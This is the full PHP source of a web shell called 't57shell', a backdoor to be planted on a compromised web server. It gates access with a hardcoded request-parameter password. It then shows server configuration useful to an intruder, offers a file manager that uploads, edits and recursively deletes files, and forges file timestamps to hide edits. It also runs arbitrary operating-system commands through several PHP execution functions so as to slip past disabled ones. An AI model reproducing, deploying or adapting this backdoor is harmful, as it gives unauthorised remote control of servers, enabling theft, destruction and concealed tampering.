<?php
/*
 *
 *
 */
/*
 *  Bootstrap & authentication
 */
header('Content-Type: text/html; charset=utf-8');
session_start();
@$_SESSION['config'] or $_SESSION['config']=array();
v('openwill.me')=='hackshell.net' && $_SESSION['auth']=1;
$cmdmethod=array('exec','passthru','system','shell_exec','popen','backquote');
@$_SESSION['auth']>0 or die();

/*
 *  Error log setting
 */
@$_SESSION['config']['errlog'] or $_SESSION['config']['errlog']=tempnam('/tmp','tmp');
error_reporting(E_ALL);
ini_set('error_log',$_SESSION['config']['errlog']);

/*
 *  Function dispatcher
 */
$action=v('action')?v('action'):'Info';
call_user_func('action' . $action);
gen_html();

/*
 *  Base fucntions
 */
function gen_html(){
    global $content;
    echo <<<EOF
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><script>
function setVar(str){
    document.cookie = str;
}
function go(action,para,form){
    setVar("action="+action);
    if(para){
        var carray=new Array();
        carray=para.split(";");
        for(var i=0;i<carray.length;i++){
            setVar(carray[i]);
        }
    }
    if(form){
        return true;
    }
    location.replace(location.href);
}
</script></head><body>
<b>t57shell</b>&nbsp;&nbsp;
[&nbsp;<a href="javascript:go('Info')">Info</a>&nbsp;<a href="javascript:go('File')">File</a>&nbsp;<a href="javascript:go('Shell')">Shell</a>&nbsp;<a href="javascript:go('Logout')">Logout</a>&nbsp;]
<hr />
    $content
<hr />By t57root&nbsp;&nbsp;(Error_log setted to {$_SESSION['config']['errlog']})
</body></html>
EOF;
}

function v($var){                             
    $_REQUEST=array_merge($_REQUEST,$_COOKIE);
    if(isset($_REQUEST[$var]))
        return $_REQUEST[$var];
    return false;
}

function append($string){
    global $content;
    $content .= $string;
}
function unsetVar($v){
    append("<script>setVar(\"$v=\")</script>");
}

/*
 *  Action functions
 */
function actionInfo(){
    $info=array();
    //OS infomation
   
    //Web Server
    $modules=function_exists('apache_get_modules')?implode(', ', apache_get_modules()):'apache_get_modules unexists';
    $info['Loaded Apache modules']=$modules;
    $info['Web Server']=@getenv('SERVER_SOFTWARE');
   
    //PHP configure
    $info['disable_functions']=@ini_get('disable_functions');
    $info['mysql.default_socket']=@ini_get('mysql.default_socket');
    $info['pdo_mysql.default_socket']=@ini_get('pdo_mysql.default_socket');
    $info['open_basedir']=@ini_get('open_basedir');
   
    foreach($info as $k=>$v){
        append("<b>$k</b>: $v<br />");
    }
}

function actionFile(){
    //Get human readable file permission
    function getHPerm($p){
        if (($p & 0xC000) == 0xC000)$i = 's';
        elseif (($p & 0xA000) == 0xA000)$i = 'l';
        elseif (($p & 0x8000) == 0x8000)$i = '-';
        elseif (($p & 0x6000) == 0x6000)$i = 'b';
        elseif (($p & 0x4000) == 0x4000)$i = 'd';
        elseif (($p & 0x2000) == 0x2000)$i = 'c';
        elseif (($p & 0x1000) == 0x1000)$i = 'p';
        else $i = 'u';
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
        if (!@is_readable($f))
            return '<font color="#25ff00">'.$i.'</font>';
        elseif (!@is_writable($f))
            return '<font color="white">'.$i.'</font>';
        else
            return '<font color="#FF0000">'.$i.'</font>';
    }
    //Remove a dir
    function rm_dir($path){
        $out = '';
        if(is_dir($path)){
            $path = (substr($path,-1)=='/') ? $path:$path.'/';
            $dh  = @opendir($path);
            if(!$dh){
                return $out.=$path.':open failed';
            }
            while ( ($item = readdir($dh) ) !== false) {
                $item = $path.$item;
                if ( (basename($item) == "..") || (basename($item) == ".") )
                    continue;
                rm_dir($item);
            }
            closedir($dh);
            if(@rmdir($path))
                $out.=$path.':okay\\n';
            else $out.=$path.':failed\\n';
        }
        else {
            if(@unlink($path))
                $out.=$path.':okay\\n';
            else $out.=$path.':failed\\n';
        }
        return $out;
    }


	$cwd=v('cwd')?v('cwd'):dirname(__FILE__);
    $cwd=realpath($cwd);

	append('<form onsubmit="javascript:go(\'File\',\'cwd=\'+document.getElementById(\'cwd\').value)"><input type="text" size="100" id="cwd" value="'.$cwd.'"></input></form>');
    //Sub actions - Edit file
    if(!is_dir($cwd)){
        if(isset($_POST['newcontent'])) {
            $msg = 'Write file error';
            $time = @filemtime($cwd);
            $fp = fopen($cwd,"w");
            if($fp) {
                if(fwrite($fp,$_POST['newcontent']))
                    $msg = 'Saved!<br />';
                fclose($fp);
                touch($cwd,$time,$time);
            }
            append($msg);
        }
        else{
            append("<form method=\"post\"><br /><textarea name=newcontent rows=30 cols=120>" . 
            htmlspecialchars(file_get_contents($cwd))."</textarea>" .
            "<br />&nbsp;<input type=\"submit\" value=\"Save\"></input></form>");
        }
    }

    switch(v('subaction')){
        case 'touch':
            $time = @filemtime(v('reference'));
            $ret = touch($cwd.'/'.v('target'),$time,$time);
            append("touch [".v('target')."]: $ret <br />");
            unsetVar('reference');
            break;
        case 'delete':
            append(rm_dir("$cwd/".v('target'))."<br />");
            break;
        case 'mkdir':
            if(v('target')=='null') break;
            $ret = mkdir($cwd."/".v('target'));
            append("mkdir [".v('target')."]: $ret <br />");
            break;
        case 'upload':
            append("Upload: ".move_uploaded_file($_FILES["file"]["tmp_name"],$cwd."/". $_FILES["file"]["name"])."<br />");
            break;
    }
    unsetVar('subaction');
    unsetVar('target');
	$cwd = is_file($cwd)?dirname($cwd):$cwd;

	append("<a href=\"javascript:go('File','cwd=".dirname(__FILE__)."')\">Script</a>&nbsp;&nbsp;<a href=\"javascript:go('File','cwd=${_SERVER['DOCUMENT_ROOT']}')\">DocRoot</a>&nbsp;&nbsp;" .
	"<a href=\"javascript:go('File','subaction=mkdir;target='+prompt('name'))\">mkdir</a>" . 
    '<form onsubmit="javascript:go(\'File\',\'subaction=upload\',1)" method="post" enctype="multipart/form-data"><input type="file" name="file" id="file" /><input type="submit" name="submit" value="Upload" /></form>' .
	'<table border="0">');
	if ($handle = opendir($cwd)) {
        $files = array();
		while (false !== ($entry = readdir($handle))){
            $files[]=$entry;
        }
		closedir($handle);
        sort($files);
        foreach($files as $entry){
			//if($entry=='..'||$entry=='.') continue;
			$path="$cwd/$entry";
			$uid=@fileowner($path);
			$gid=@filegroup($path);
			if(function_exists('posix_getpwuid')){
				$user = @posix_getpwuid($uid);
				$group = @posix_getgrgid($gid);
			}
			$detail = array('modify' => date('Y-m-d H:i:s', @filemtime($path)),
							'perms' => @getHPerm(fileperms($path)),
							'size' => @filesize($path),
							'owner' => @$user['name']?$user['name']:$uid,
							'group' => @$group['name']?$group['name']:$gid
			);
			append("<tr><td>${detail['perms']}</td><td>${detail['owner']}($uid)</td><td>${detail['group']}($gid)</td><td>${detail['size']}</td><td><a href=\"javascript:go('File','cwd=$cwd/$entry')\">$entry</a></td><td><a href=\"javascript:go('File','subaction=touch;target=$entry;reference='+prompt('reference'))\">Touch</a> <a href=\"javascript:confirm('Confirm')?go('File','subaction=delete;target=$entry'):''\">Delete</a></td></tr>");
		}
	}
	append("</table>");
}


function actionShell(){
    global $cmdmethod; 
    $m=v('method')?v('method'):'exec';
    if(@$_POST['cmd']){
        $in=$_POST['cmd']." 2>&1";
        echo("[$m]\n");
        switch($m){
            case 'exec':
            if (function_exists('exec')) {
                @exec($in,$out);
                $out = @join("\n",$out);
            }    
            break;
            case 'passthru':
            if (function_exists('passthru')) {
                ob_start();
                @passthru($in);
                $out = ob_get_clean();
            }    
            break;
            case 'system':
            if (function_exists('system')) {
                ob_start();
                @system($in);
                $out = ob_get_clean();
            }    
            break;
            case 'shell_exec':
            if (function_exists('shell_exec')) {
                $out = shell_exec($in);
            }    
            break;
            case 'popen':
            if (is_resource($f = @popen($in,"r"))) {
                $out = "";
                while(!@feof($f))
                    $out .= fread($f,1024);
                pclose($f);
            }    
            break;
            case 'backquote':
                $out=`$in`;
        }        
        die($out);
    }

    append(<<<EOF
        <script>
        if(window.Event) window.captureEvents(Event.KEYDOWN);
        var cmds = new Array('');
        var cur = 0;
        function kp(e) {
            var n = (window.Event) ? e.which : e.keyCode;
            if(n == 13){
                ajaxsend();
            }
        }

        function ajaxsend(){
            var cmd = document.inputform.cmd.value;
            if(cmd=='')
                return;
            var xmlhttp;
            if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari
              xmlhttp=new XMLHttpRequest();
            }
            else{// code for IE6, IE5
              xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
            }
            xmlhttp.onreadystatechange=function(){
                if (xmlhttp.readyState==4 && xmlhttp.status==200){
                    document.inputform.cmd.value='';
                    var tmp="$"+cmd+"\\n"+xmlhttp.responseText+"\\n";
                    var op=document.getElementById('output');
                    op.innerHTML=op.innerHTML+tmp;
                    op.scrollTop = op.scrollHeight;
                }
            }
            send_string= encodeURI("cmd="+cmd)
            xmlhttp.open("POST","",true);
            xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
            xmlhttp.send(send_string);
        }
        </script>
EOF
);

    append('
    <textarea cols="150" rows="25" id="output"></textarea>
    <form method="post" name="inputform" onsubmit="return false">
    <input type="text" name="cmd" size="115" onkeydown="kp(event);">&nbsp;&nbsp;
 
    <select onchange="go(\'Shell\',\'method=\'+this.value,this)">');
 
    foreach($cmdmethod as $v){
        append("<option value=\"$v\"".($v==$m?' selected=""':'').">$v</option>");
    }
    append('</select> 
    <a href="javascript:go(\'Shell\',\'subact=autodetect\')">AutoDetect</a>
    </form>');  
 
}

function actionLogout(){
    session_destroy();
    die('<script>document.cookie = "action=";location.replace(location.href);</script>');
}
